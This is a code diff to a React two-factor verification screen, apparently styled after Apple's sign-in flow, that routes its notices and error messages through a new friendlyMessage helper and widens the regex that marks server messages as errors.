@@ -8,6 +8,7 @@ import {
   switch2fa,
 } from "../lib/socket";
 import { useAuthState } from "../lib/useAuth";
+import { friendlyMessage } from "../lib/messages";
 
 function Choice({ option, selected, onClick, disabled }) {
   return (
@@ -37,7 +38,7 @@ export default function Verify({ onContinue }) {
   const [digits, setDigits] = useState(["", "", "", "", "", ""]);
   const [focusIdx, setFocusIdx] = useState(0);
   const [choiceId, setChoiceId] = useState(twofa?.choiceId || "");
-  const [notice, setNotice] = useState(twofa?.notice || "");
+  const [notice, setNotice] = useState(() => friendlyMessage(twofa?.notice || "", ""));
   const [busy, setBusy] = useState(false);
   const [error, setError] = useState("");
   const [dismissed, setDismissed] = useState("");
@@ -53,7 +54,7 @@ export default function Verify({ onContinue }) {
   useEffect(() => {
     if (!twofa) return;
     setChoiceId(twofa.choiceId || "");
-    setNotice(twofa.notice || "");
+    setNotice(friendlyMessage(twofa.notice || "", ""));
   }, [twofa]);
 
   useEffect(() => {
@@ -71,10 +72,11 @@ export default function Verify({ onContinue }) {
   // the failure wording as an Apple error row, not as neutral help text.
   const stateError =
     auth.state === "twofa" &&
-    /not accepted|incorrect|failed|expired|timed out|too many/i.test(auth.message || "")
+    /not accepted|incorrect|failed|expired|timed out|too many|resend|switch/i.test(auth.message || "")
       ? auth.message
       : "";
-  const serverError = stateError && stateError !== dismissed ? stateError : "";
+  const serverError =
+    stateError && stateError !== dismissed ? friendlyMessage(stateError) : "";
   const shownError = error || serverError;
 
   function applyDigits(raw, start = 0) {
@@ -153,9 +155,9 @@ export default function Verify({ onContinue }) {
         toChoiceId: option.id,
       });
       setChoiceId(option.id);
-      if (result.notice) setNotice(result.notice);
+      if (result.notice) setNotice(friendlyMessage(result.notice, ""));
     } catch (failure) {
-      setError(failure.message);
+      setError(friendlyMessage(failure.message));
     } finally {
       setBusy(false);
     }
@@ -168,9 +170,9 @@ export default function Verify({ onContinue }) {
     try {
       const result = await resend2fa({ jobId: auth.jobId, choiceId });
       setCooldown(30);
-      if (result.notice) setNotice(result.notice);
+      if (result.notice) setNotice(friendlyMessage(result.notice, ""));
     } catch (failure) {
-      setError(failure.message);
+      setError(friendlyMessage(failure.message));
     } finally {
       setBusy(false);
     }
@@ -197,7 +199,7 @@ export default function Verify({ onContinue }) {
       });
       setNotice("Checking the code…");
     } catch (failure) {
-      setError(failure.message);
+      setError(friendlyMessage(failure.message));
     } finally {
       inflight.current = false;
       setBusy(false);
@@ -238,7 +240,7 @@ export default function Verify({ onContinue }) {
                   ))}
                 </div>
                 <div className="mt-2 flex items-center justify-between gap-3 text-[12px] leading-4 text-[#6e6e73]">
-                  <span aria-live="polite">{shownError ? "" : notice || auth.message}</span>
+                  <span aria-live="polite">{shownError ? "" : notice || friendlyMessage(auth.message || "", "")}</span>
                   <button
                     type="button"
                     onClick={resend}
